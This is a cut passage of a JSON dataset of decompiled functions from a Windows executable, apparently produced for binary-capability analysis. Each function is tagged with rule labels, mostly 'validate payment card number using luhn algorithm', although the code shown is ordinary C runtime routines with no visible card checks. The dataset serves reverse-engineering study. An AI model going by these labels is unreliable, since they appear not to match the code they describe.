        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nuint __cdecl fcn.00463c56(char *arg_8h, int32_t arg_ch)\n\n{\n    uint32_t arg_ch_00;\n    char cVar1;\n    char cVar2;\n    code *pcVar3;\n    uint *puVar4;\n    char *pcVar5;\n    int32_t iVar6;\n    int32_t *piVar7;\n    int32_t iVar8;\n    uint uVar9;\n    char *pcVar10;\n    char *arg_8h_00;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_1h;\n    \n    if (arg_8h == NULL) {\n        puVar4 = fcn.0043bcb5();\n        *puVar4 = 0x16;\n        return 0xffffffff;\n    }\n    pcVar5 = fcn.0047a100(arg_8h, 0x3d);\n    if ((pcVar5 == NULL) || (pcVar5 == arg_8h)) {\n        puVar4 = fcn.0043bcb5();\n        *puVar4 = 0x16;\n        fcn.0045d185(arg_8h);\n        return 0xffffffff;\n    }\n    cVar1 = pcVar5[1];\n    fcn.004639e0();\n    uVar9 = 0;\n    if (*0x6ccf9c == NULL) {\n        if ((arg_ch != 0) && (*0x6ccfa0 != 0)) {\n            iVar6 = fcn.00457d8c();\n            if (iVar6 == 0) {\n                puVar4 = fcn.0043bcb5();\n                *puVar4 = 0x16;\n                goto code_r0x00463401;\n            }\n            fcn.004639e0();\n            goto code_r0x0046345c;\n        }\n        if (cVar1 == '\\0') goto code_r0x004635a8;\n        *0x6ccf9c = fcn.00460ec9(1, 4);\n        fcn.0045d185(0);\n        if (*0x6ccf9c != NULL) {\n            if (*0x6ccfa0 == 0) {\n                *0x6ccfa0 = fcn.00460ec9(1, 4);\n                fcn.0045d185(0);\n                if (*0x6ccfa0 == 0) goto code_r0x00463401;\n            }\n            goto code_r0x0046345c;\n        }\n    }\n    else {\ncode_r0x0046345c:\n        piVar7 = *0x6ccf9c;\n        if (*0x6ccf9c != NULL) {\n            iVar6 = fcn.00463a14(arg_8h, pcVar5 - arg_8h);\n            if ((-1 < iVar6) && (*piVar7 != 0)) {\n                fcn.0045d185(piVar7[iVar6]);\n                if (cVar1 == '\\0') {\n                    for (; piVar7[iVar6] != 0; iVar6 = iVar6 + 1) {\n                        piVar7[iVar6] = piVar7[iVar6 + 1];\n                    }\n                    piVar7 = fcn.0043bd85(piVar7, iVar6, 4);\n                    fcn.0045d185(0);\n                    arg_8h_00 = arg_8h;\n                    if (piVar7 != NULL) {\ncode_r0x00463520:\n                        *0x6ccf9c = piVar7;\n                    }\n                }\n                else {\n                    arg_8h_00 = NULL;\n                    piVar7[iVar6] = arg_8h;\n                }\n                if (arg_ch == 0) {\ncode_r0x004635b8:\n                    fcn.0045d185(arg_8h_00);\n                    return 0;\n                }\n                pcVar10 = arg_8h;\n                do {\n                    cVar2 = *pcVar10;\n                    pcVar10 = pcVar10 + 1;\n                } while (cVar2 != '\\0');\n                iVar6 = fcn.00460ec9(pcVar10 + (2 - (arg_8h + 1)), 1);\n                if (iVar6 == 0) {\n                    fcn.0045d185(0);\n                    arg_8h = arg_8h_00;\n                }\n                else {\n                    iVar8 = fcn.0045acc6(iVar6, pcVar10 + (2 - (arg_8h + 1)), arg_8h);\n                    if (iVar8 != 0) {\n                        fcn.0043bb6b(0, 0, 0, 0, 0);\n                        pcVar3 = swi(3);\n                        uVar9 = (*pcVar3)();\n                        return uVar9;\n                    }\n                    pcVar5[iVar6 - arg_8h] = '\\0';\n                    iVar8 = fcn.0046e660(iVar6, -(cVar1 != '\\0') & pcVar5 + (iVar6 - arg_8h) + 1);\n                    if (iVar8 != 0) {\n                        fcn.0045d185(iVar6);\n                        goto code_r0x004635b8;\n                    }\n                    puVar4 = fcn.0043bcb5();\n                    *puVar4 = 0x2a;\n                    fcn.0045d185(iVar6);\n                    uVar9 = 0xffffffff;\n                    arg_8h = arg_8h_00;\n                }\n                goto code_r0x004635a8;\n            }\n            if (cVar1 == '\\0') goto code_r0x004635a8;\n            arg_ch_00 = -iVar6 + 2;\n            if ((-iVar6 <= arg_ch_00) && (arg_ch_00 < 0x3fffffff)) {\n                piVar7 = fcn.0043bd85(piVar7, arg_ch_00, 4);\n                fcn.0045d185(0);\n                if (piVar7 != NULL) {\n                    piVar7[-iVar6] = arg_8h;\n                    piVar7[1 - iVar6] = 0;\n                    arg_8h_00 = NULL;\n                    goto code_r0x00463520;\n                }\n            }\n        }\n    }\ncode_r0x00463401:\n    uVar9 = 0xffffffff;\ncode_r0x004635a8:\n    fcn.0045d185(arg_8h);\n    return uVar9;\n}\n",
        "token_count": 1478
    },
    "00463c61": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00463c61(int16_t *arg_8h, int32_t arg_ch)\n\n{\n    uint32_t arg_ch_00;\n    int16_t iVar1;\n    int16_t iVar2;\n    code *pcVar3;\n    uint *puVar4;\n    int16_t *piVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    int32_t *piVar8;\n    int32_t arg_8h_00;\n    uint uVar9;\n    int16_t *piVar10;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    int32_t *var_4h;\n    \n    if (arg_8h == NULL) {\n        puVar4 = fcn.0043bcb5();\n        *puVar4 = 0x16;\n        return 0xffffffff;\n    }\n    piVar5 = fcn.0047a22b(arg_8h, 0x3d);\n    if ((piVar5 == NULL) || (piVar5 == arg_8h)) {\n        puVar4 = fcn.0043bcb5();\n        *puVar4 = 0x16;\n        fcn.0045d185(arg_8h);\n        return 0xffffffff;\n    }\n    iVar2 = piVar5[1];\n    fcn.004639fa();\n    uVar9 = 0;\n    var_4h = *0x6ccfa0;\n    if (*0x6ccfa0 == NULL) {\n        if ((arg_ch == 0) || (*0x6ccf9c == 0)) {\n            if (iVar2 == 0) goto code_r0x00463833;\n            if (*0x6ccf9c == 0) {\n                *0x6ccf9c = fcn.00460ec9(1, 4);\n                fcn.0045d185(0);\n                if (*0x6ccf9c == 0) goto code_r0x00463670;\n                var_4h = *0x6ccfa0;\n                if (*0x6ccfa0 != NULL) goto code_r0x004636e4;\n            }\n            *0x6ccfa0 = fcn.00460ec9(1, 4);\n            fcn.0045d185(0);\n            if (*0x6ccfa0 != NULL) goto code_r0x004636e0;\n        }\n        else {\n            iVar6 = fcn.00457d91();\n            if (iVar6 == 0) {\n                puVar4 = fcn.0043bcb5();\n                *puVar4 = 0x16;\n            }\n            else {\n                fcn.004639fa();\ncode_r0x004636e0:\n                var_4h = *0x6ccfa0;\n                if (*0x6ccfa0 != NULL) goto code_r0x004636e4;\n            }\n        }\n    }\n    else {\ncode_r0x004636e4:\n        iVar6 = piVar5 - arg_8h >> 1;\n        *0x6ccfa0 = var_4h;\n        iVar7 = fcn.00463a69(arg_8h, iVar6);\n        if ((-1 < iVar7) && (*var_4h != 0)) {\n            fcn.0045d185(var_4h[iVar7]);\n            if (iVar2 == 0) {\n                for (; var_4h[iVar7] != 0; iVar7 = iVar7 + 1) {\n                    var_4h[iVar7] = var_4h[iVar7 + 1];\n                }\n                piVar8 = fcn.0043bd85(var_4h, iVar7, 4);\n                fcn.0045d185(0);\n                piVar5 = arg_8h;\n                if (piVar8 != NULL) {\ncode_r0x004637a5:\n                    *0x6ccfa0 = piVar8;\n                }\n            }\n            else {\n                piVar5 = NULL;\n                var_4h[iVar7] = arg_8h;\n            }\n            if (arg_ch == 0) {\ncode_r0x00463843:\n                fcn.0045d185(piVar5);\n                return 0;\n            }\n            piVar10 = arg_8h;\n            do {\n                iVar1 = *piVar10;\n                piVar10 = piVar10 + 1;\n            } while (iVar1 != 0);\n            iVar7 = (piVar10 - (arg_8h + 1) >> 1) + 2;\n            arg_8h_00 = fcn.00460ec9(iVar7, 2);\n            if (arg_8h_00 == 0) {\n                fcn.0045d185(0);\n                arg_8h = piVar5;\n            }\n            else {\n                iVar7 = fcn.0043be56(arg_8h_00, iVar7, arg_8h);\n                if (iVar7 != 0) {\n                    fcn.0043bb6b(0, 0, 0, 0, 0);\n                    pcVar3 = swi(3);\n                    uVar9 = (*pcVar3)();\n                    return uVar9;\n                }\n                *(arg_8h_00 + iVar6 * 2) = 0;\n                iVar6 = (*_sym.imp.KERNEL32.dll_SetEnvironmentVariableW)\n                                  (arg_8h_00, -(iVar2 != 0) & arg_8h_00 + (iVar6 + 1) * 2);\n                if (iVar6 != 0) {\n                    fcn.0045d185(arg_8h_00);\n                    goto code_r0x00463843;\n                }\n                puVar4 = fcn.0043bcb5();\n                *puVar4 = 0x2a;\n                fcn.0045d185(arg_8h_00);\n                uVar9 = 0xffffffff;\n                arg_8h = piVar5;\n            }\n            goto code_r0x00463833;\n        }\n        if (iVar2 == 0) goto code_r0x00463833;\n        arg_ch_00 = -iVar7 + 2;\n        if ((-iVar7 <= arg_ch_00) && (arg_ch_00 < 0x3fffffff)) {\n            piVar8 = fcn.0043bd85(var_4h, arg_ch_00, 4);\n            fcn.0045d185(0);\n            if (piVar8 != NULL) {\n                piVar8[-iVar7] = arg_8h;\n                piVar8[1 - iVar7] = 0;\n                piVar5 = NULL;\n                goto code_r0x004637a5;\n            }\n        }\n    }\ncode_r0x00463670:\n    uVar9 = 0xffffffff;\ncode_r0x00463833:\n    fcn.0045d185(arg_8h);\n    return uVar9;\n}\n",
        "token_count": 1565
    },
    "00463f37": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00463f37(uint arg_8h)\n\n{\n    uint *puVar1;\n    uint *in_ECX;\n    \n    puVar1 = in_ECX + 1;\n    if (in_ECX != puVar1) {\n        do {\n            *in_ECX = arg_8h;\n            in_ECX = in_ECX + 1;\n        } while (in_ECX != puVar1);\n    }\n    return;\n}\n",
        "token_count": 101
    },
    "00464748": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nvoid __fastcall fcn.00464748(uint *param_1)\n\n{\n    uint *puVar1;\n    char cVar2;\n    uint *puVar3;\n    uint *var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_1h;\n    \n    puVar1 = *0x6cd618 + *0x6cd614;\n    for (puVar3 = *0x6cd618; puVar3 != puVar1; puVar3 = puVar3 + 1) {\n        var_8h = *puVar3;\n        cVar2 = fcn.00464872(var_8h, *param_1);\n        if (cVar2 != '\\0') {\n            var_20h = &var_8h;\n            var_1ch = *param_1;\n            var_18h = param_1[1];\n            var_14h = param_1[2];\n            var_ch = var_8h;\n            var_10h = var_8h;\n            fcn.004643f1(&var_10h, &var_20h);\n        }\n    }\n    return;\n}\n",
        "token_count": 300
    },
    "00464ae9": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00464ae9(int16_t *arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    int16_t iVar1;\n    uint *puVar2;\n    int16_t *piVar3;\n    uint uStack20;\n    \n    if ((arg_8h != NULL) && (arg_ch != 0)) {\n        piVar3 = arg_8h;\n        if (arg_10h != 0) {\n            do {\n                if (*piVar3 == 0) {\n                    arg_10h = arg_10h - piVar3;\n                    do {\n                        iVar1 = *(arg_10h + piVar3);\n                        *piVar3 = iVar1;\n                        piVar3 = piVar3 + 1;\n                        if (iVar1 == 0) {\n                            return 0;\n                        }\n                        arg_ch = arg_ch + -1;\n                    } while (arg_ch != 0);\n                    *arg_8h = 0;\n                    puVar2 = fcn.0043bcb5();\n                    uStack20 = 0x22;\n                    goto code_r0x00464b12;\n                }\n                arg_ch = arg_ch + -1;\n                piVar3 = piVar3 + 1;\n            } while (arg_ch != 0);\n        }\n        *arg_8h = 0;\n    }\n    puVar2 = fcn.0043bcb5();\n    uStack20 = 0x16;\ncode_r0x00464b12:\n    *puVar2 = uStack20;\n    fcn.0043bb3e();\n    return uStack20;\n}\n",
        "token_count": 363
    },
    "004660e2": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004660e2(uint *arg_8h, int32_t arg_ch)\n\n{\n    uint *puVar1;\n    \n    puVar1 = arg_8h + arg_ch;\n    for (; arg_8h != puVar1; arg_8h = arg_8h + 1) {\n        fcn.0045d185(*arg_8h);\n    }\n    return;\n}\n",
        "token_count": 92
    },
    "004672c8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nbool __cdecl fcn.004672c8(uint arg_8h, int32_t arg_ch, int16_t **arg_10h)\n\n{\n    int16_t iVar1;\n    int16_t *arg_8h_00;\n    int32_t iVar2;\n    int16_t *piVar3;\n    \n    iVar2 = fcn.0046727b(arg_8h);\n    if ((iVar2 == 0) && (arg_ch != 0)) {\n        arg_8h_00 = *arg_10h;\n        piVar3 = arg_8h_00;\n        do {\n            iVar1 = *piVar3;\n            piVar3 = piVar3 + 1;\n        } while (iVar1 != 0);\n        iVar2 = fcn.00466db7(arg_8h_00);\n        return iVar2 != piVar3 - (arg_8h_00 + 1) >> 1;\n    }\n    return true;\n}\n",
        "token_count": 212
    },
    "0046737e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0046737e(int16_t *arg_8h, uint32_t *arg_ch, int32_t arg_10h)\n\n{\n    int16_t **arg_8h_00;\n    int16_t **arg_10h_00;\n    int16_t *arg_10h_01;\n    ushort *arg_8h_01;\n    int16_t iVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint32_t arg_8h_02;\n    uint uVar5;\n    int16_t *piVar6;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar3 = fcn.0045ce63();\n    arg_8h_00 = iVar3 + 0x50;\n    arg_10h_01 = iVar3 + 0x2a0;\n    *(iVar3 + 0x58) = 0;\n    *arg_10h_01 = 0;\n    arg_10h_00 = iVar3 + 0x54;\n    *arg_8h_00 = arg_8h;\n    *arg_10h_00 = arg_8h + 0x40;\n    if (arg_8h[0x40] != 0) {\n        fcn.00467311(0x480198, 0x16, arg_10h_00);\n    }\n    if (**arg_8h_00 == 0) {\n        fcn.00466c3e(arg_8h_00);\n    }\n    else {\n        if (**arg_10h_00 == 0) {\n            fcn.00466d5e(arg_8h_00);\n        }\n        else {\n            fcn.00466cc5(arg_8h_00);\n        }\n        if ((*(iVar3 + 0x58) == 0) && (iVar4 = fcn.00467311(0x47fe88, 0x40, arg_8h_00),  iVar4 != 0)) {\n            if (**arg_10h_00 == 0) {\n                fcn.00466d5e(arg_8h_00);\n            }\n            else {\n                fcn.00466cc5(arg_8h_00);\n            }\n        }\n    }\n    if (*(iVar3 + 0x58) != 0) {\n        if (((arg_8h == NULL) || (*arg_8h != 0)) || (arg_8h[0x80] != 0)) {\n            arg_8h_02 = fcn.0046718b(-(arg_8h != NULL) & arg_8h + 0x80, arg_8h_00);\n        }\n        else {\n            arg_8h_02 = (*_sym.imp.KERNEL32.dll_GetACP)();\n        }\n        if (((arg_8h_02 != 0) && (arg_8h_02 != 65000)) &&\n           (iVar4 = (*_sym.imp.KERNEL32.dll_IsValidCodePage)(arg_8h_02 & 0xffff),  iVar4 != 0)) {\n            if (arg_ch != NULL) {\n                *arg_ch = arg_8h_02;\n            }\n            if (arg_10h == 0) {\n                return 1;\n            }\n            arg_8h_01 = arg_10h + 0x120;\n            *arg_8h_01 = 0;\n            piVar6 = arg_10h_01;\n            do {\n                iVar1 = *piVar6;\n                piVar6 = piVar6 + 1;\n            } while (iVar1 != 0);\n            iVar3 = fcn.0043bf88(arg_8h_01, 0x55, arg_10h_01, (piVar6 - (iVar3 + 0x2a2) >> 1) + 1);\n            if (iVar3 != 0) {\ncode_r0x00467576:\n                fcn.0043bb6b(0, 0, 0, 0, 0);\n                pcVar2 = swi(3);\n                uVar5 = (*pcVar2)();\n                return uVar5;\n            }\n            iVar3 = fcn.0046054c(arg_8h_01, 0x1001, arg_10h, 0x40);\n            if (iVar3 != 0) {\n                iVar3 = arg_10h + 0x80;\n                iVar4 = fcn.0046054c(arg_10h + 0x120, 0x1002, iVar3, 0x40);\n                if ((iVar4 != 0) &&\n                   (((iVar4 = fcn.0047a22b(iVar3, 0x5f),  iVar4 == 0 && (iVar4 = fcn.0047a22b(iVar3, 0x2e),  iVar4 == 0)\n                     ) || (iVar3 = fcn.0046054c(arg_10h + 0x120, 7, iVar3, 0x40),  iVar3 != 0)))) {\n                    if (arg_8h_02 != 0xfde9) {\n                        fcn.0046fdd8(arg_8h_02, arg_10h + 0x100, 0x10, 10);\n                        return 1;\n                    }\n                    iVar3 = fcn.0043bf88(arg_10h + 0x100, 0x10, L\"utf8\", 5);\n                    if (iVar3 == 0) {\n                        return 1;\n                    }\n                    goto code_r0x00467576;\n                }\n            }\n        }\n    }\n    return 0;\n}\n",
        "token_count": 1276
    },
    "00467ae1": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00467ae1(uint16_t *arg_8h)\n\n{\n    uint16_t uVar1;\n    int32_t iVar2;\n    \n    iVar2 = 0;\n    uVar1 = *arg_8h;\n    while (uVar1 != 0) {\n        arg_8h = arg_8h + 1;\n        if (uVar1 - 0x61 < 6) {\n            uVar1 = uVar1 - 0x27;\n        }\n        else if (uVar1 - 0x41 < 6) {\n            uVar1 = uVar1 - 7;\n        }\n        iVar2 = iVar2 * 0x10 + -0x30 + uVar1;\n        uVar1 = *arg_8h;\n    }\n    return iVar2;\n}\n",
        "token_count": 185
    },
    "00468f46": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl\nfcn.00468f46(char *arg_8h, uint32_t arg_ch, int32_t arg_10h, uint *arg_14h, uint arg_18h, uint arg_1ch, int32_t arg_20h)\n\n{\n    char *arg_8h_00;\n    char cVar1;\n    int32_t iVar2;\n    char *arg_ch_00;\n    char *pcVar3;\n    uint uVar4;\n    uint var_4h;\n    \n    if (arg_8h == NULL) {\n        *(arg_20h + 0x1c) = 1;\n        *(arg_20h + 0x18) = 0x16;\n        fcn.0043bac1(0, 0, 0, 0, 0, arg_20h);\n        return 0x16;\n    }\n    if (arg_ch != 0) {\n        *arg_8h = '\\0';\n        iVar2 = arg_10h;\n        if (arg_10h < 1) {\n            iVar2 = 0;\n        }\n        if (arg_ch <= iVar2 + 1U) {\n            uVar4 = 0x22;\n            goto code_r0x00468f9f;\n        }\n        if (arg_14h != NULL) {\n            arg_8h_00 = arg_14h[2];\n            pcVar3 = arg_8h + 1;\n            *arg_8h = '0';\n            arg_ch_00 = arg_8h_00;\n            if (0 < arg_10h) {\n                do {\n                    cVar1 = *arg_ch_00;\n                    if (cVar1 == '\\0') {\n                        cVar1 = '0';\n                    }\n                    else {\n                        arg_ch_00 = arg_ch_00 + 1;\n                    }\n                    *pcVar3 = cVar1;\n                    pcVar3 = pcVar3 + 1;\n                    arg_10h = arg_10h + -1;\n                } while (0 < arg_10h);\n            }\n            *pcVar3 = '\\0';\n            if ((-1 < arg_10h) &&\n               (cVar1 = fcn.00468eb8(arg_8h_00, arg_ch_00, *arg_14h, arg_18h, arg_1ch),  cVar1 != '\\0')) {\n                while( true ) {\n                    pcVar3 = pcVar3 + -1;\n                    if (*pcVar3 != '9') break;\n                    *pcVar3 = '0';\n                }\n                *pcVar3 = *pcVar3 + '\\x01';\n            }\n            if (*arg_8h == '1') {\n                arg_14h[1] = arg_14h[1] + 1;\n            }\n            else {\n                pcVar3 = arg_8h + 1;\n                do {\n                    cVar1 = *pcVar3;\n                    pcVar3 = pcVar3 + 1;\n                } while (cVar1 != '\\0');\n                fcn.00431830(arg_8h, arg_8h + 1, pcVar3 + (1 - (arg_8h + 2)));\n            }\n            return 0;\n        }\n    }\n    uVar4 = 0x16;\ncode_r0x00468f9f:\n    *(arg_20h + 0x18) = uVar4;\n    *(arg_20h + 0x1c) = 1;\n    fcn.0043bac1(0, 0, 0, 0, 0, arg_20h);\n    return uVar4;\n}\n",
        "token_count": 810
    },
    "0046a349": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0046a349(uint arg_8h, uint arg_ch)\n\n{\n    int32_t in_ECX;\n    uint var_4h;\n    \n    *(in_ECX + 4) = arg_ch;\n    fcn.0045ac0d(in_ECX, 0, 0);\n    fcn.0045ac0d(&var_4h, arg_8h, *(in_ECX + 4));\n    return;\n}\n",
        "token_count": 102
    },
    "0046a3a4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0046a3a4(uint *param_1)\n\n{\n    uint *var_4h;\n    \n    var_4h = param_1;\n    fcn.0045ac0d(&var_4h, *param_1, param_1[1]);\n    return;\n}\n",
        "token_count": 69
    },
    "0046ccf9": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0046ccf9(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint uVar1;\n    uint var_28h;\n    \n    fcn.0043b732(0);\n    uVar1 = fcn.0046cc49(arg_8h, arg_ch, arg_10h, &var_28h);\n    fcn.0043b78b();\n    return uVar1;\n}\n",
        "token_count": 102
    },
    "0046cd5c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0046cd5c(ushort *arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    uint32_t uVar1;\n    uint32_t var_4h;\n    \n    uVar1 = fcn.004716ae(&var_4h, arg_ch, arg_10h, arg_14h, arg_18h);\n    if (uVar1 < 5) {\n        if (0xffff < var_4h) {\n            var_4h = 0xfffd;\n        }\n        if (arg_8h != NULL) {\n            *arg_8h = var_4h;\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 168
    },
    "0046d0bf": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0046d0bf(int32_t arg_8h, int32_t *arg_ch, int32_t arg_10h, int32_t arg_14h, int32_t arg_18h)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t arg_10h_00;\n    int32_t *in_FS_OFFSET;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint uStack8;\n    \n    uStack8 = 0xffffffff;\n    uStack12 = 0x47a4c8;\n    var_ch = *in_FS_OFFSET;\n    uVar1 = *0x6cade0 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    if (arg_ch == NULL) {\n        *(arg_18h + 0x1c) = 1;\n        *(arg_18h + 0x18) = 0x16;\n        fcn.0043bac1(0, 0, 0, 0, 0, arg_18h);\n    }\n    else {\n        arg_10h_00 = *arg_ch;\n        iVar2 = 0;\n        var_14h = 0;\n        if (arg_14h == 0) {\n            arg_14h = 0x6cdae8;\n        }\n        if (*(arg_18h + 0x14) == '\\0') {\n            fcn.00453bd0(uVar1);\n        }\n        if (*(*(arg_18h + 0xc) + 8) == 0xfde9) {\n            iVar2 = fcn.0046cd9f(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h);\n            goto code_r0x0046d208;\n        }\n        var_10h = arg_8h;\n        if (arg_8h != 0) {\n            var_18h = arg_10h;\n            if (arg_10h != 0) {\n                do {\n                    fcn.0046cea7(&var_14h, var_10h, arg_10h_00, 0x7fffffff, arg_14h, arg_18h);\n                    if (var_14h < 0) {\n                        iVar2 = -1;\n                        break;\n                    }\n                    if (var_14h == 0) {\n                        arg_10h_00 = 0;\n                        break;\n                    }\n                    arg_10h_00 = arg_10h_00 + var_14h;\n                    iVar2 = iVar2 + 1;\n                    var_10h = var_10h + 2;\n                    var_18h = var_18h + -1;\n                } while (var_18h != 0);\n            }\n            *arg_ch = arg_10h_00;\n            goto code_r0x0046d208;\n        }\n        fcn.0046cea7(&var_14h, &var_10h, arg_10h_00, 0x7fffffff, arg_14h, arg_18h);\n        while (-1 < var_14h) {\n            if (var_14h == 0) goto code_r0x0046d208;\n            arg_10h_00 = arg_10h_00 + var_14h;\n            iVar2 = iVar2 + 1;\n            fcn.0046cea7(&var_14h, &var_10h, arg_10h_00, 0x7fffffff, arg_14h, arg_18h);\n        }\n    }\n    iVar2 = -1;\ncode_r0x0046d208:\n    *in_FS_OFFSET = var_ch;\n    return iVar2;\n}\n",
        "token_count": 857
    },
    "0046d34a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0046d34a(uint arg_8h, uint arg_ch, int32_t arg_10h)\n\n{\n    uint var_2ch;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    fcn.0043b732(0);\n    if (arg_10h == 0) {\n        arg_10h = 0x6cdad8;\n    }\n    fcn.0046cea7(&var_4h, 0, arg_8h, arg_ch, arg_10h, &var_2ch);\n    fcn.0043b78b();\n    return var_4h;\n}\n",
        "token_count": 149
    },
    "0046d392": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0046d392(uint arg_8h, int32_t arg_ch, uint arg_10h, int32_t arg_14h)\n\n{\n    uint var_2ch;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    fcn.0043b732(0);\n    if (arg_ch == 0) {\n        if (arg_14h == 0) {\n            arg_14h = 0x6cdae0;\n        }\n        arg_ch = 0x47d4ae;\n        arg_10h = 1;\n        arg_8h = 0;\n    }\n    else if (arg_14h == 0) {\n        arg_14h = 0x6cdae0;\n    }\n    fcn.0046cea7(&var_4h, arg_8h, arg_ch, arg_10h, arg_14h, &var_2ch);\n    fcn.0043b78b();\n    return var_4h;\n}\n",
        "token_count": 229
    },
    "0046d3f9": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0046d3f9(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint uVar1;\n    uint var_28h;\n    \n    fcn.0043b732(0);\n    uVar1 = fcn.0046d0bf(arg_8h, arg_ch, arg_10h, arg_14h, &var_28h);\n    fcn.0043b78b();\n    return uVar1;\n}\n",
        "token_count": 115
    },
    "0046d433": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0046d433(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    uint uVar1;\n    uint var_28h;\n    \n    fcn.0043b732(0);\n    uVar1 = fcn.0046d21d(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, arg_1ch, &var_28h);\n    fcn.0043b78b();\n    return uVar1;\n}\n",
        "token_count": 135
    },
    "0046e1fb": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_8h\n// WARNING: Variable defined which should be unmapped: var_14h\n\nvoid __cdecl\nfcn.0046e1fb(int32_t *arg_8h, uint arg_ch, uint32_t arg_10h, uint arg_14h, int32_t arg_18h, uint arg_1ch, \n            int32_t arg_20h, int32_t arg_24h, int32_t arg_28h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint *arg_18h_00;\n    int32_t iVar3;\n    uint *arg_18h_01;\n    int32_t iVar4;\n    uint unaff_EDI;\n    uint *puVar5;\n    uint var_14h;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar3 = arg_18h;\n    var_14h = unaff_EDI;\n    if (0 < arg_18h) {\n        iVar1 = fcn.00471f9a(arg_14h, arg_18h);\n        iVar3 = iVar1 + 1;\n        if (arg_18h <= iVar1) {\n            iVar3 = iVar1;\n        }\n    }\n    if (arg_24h == 0) {\n        arg_24h = *(*arg_8h + 8);\n    }\n    iVar1 = fcn.004630d8(arg_24h, (arg_28h != 0) * 8 + 1, arg_14h, iVar3, 0, 0);\n    arg_18h_00 = &var_14h;\n    if (iVar1 == 0) goto code_r0x0046e3d8;\n    uVar2 = iVar1 * 2 + 8;\n    uVar2 = -(iVar1 * 2 < uVar2) & uVar2;\n    if (uVar2 == 0) {\n        arg_18h_00 = NULL;\n    }\n    else if (uVar2 < 0x401) {\n        fcn.00476f20();\n        if (*0x10 != 0x18) {\n            var_14h = 0xcccc;\n            arg_18h_00 = &var_14h;\ncode_r0x0046e2ae:\n            arg_18h_00 = arg_18h_00 + 2;\n            if ((arg_18h_00 != NULL) &&\n               (iVar3 = fcn.004630d8(arg_24h, 1, arg_14h, iVar3, arg_18h_00, iVar1),  iVar3 != 0)) {\n                puVar5 = &stack0xffffffc4;\n                arg_18h_01 = &stack0xffffffc4;\n                iVar3 = fcn.0046078f(arg_ch, arg_10h, arg_18h_00, 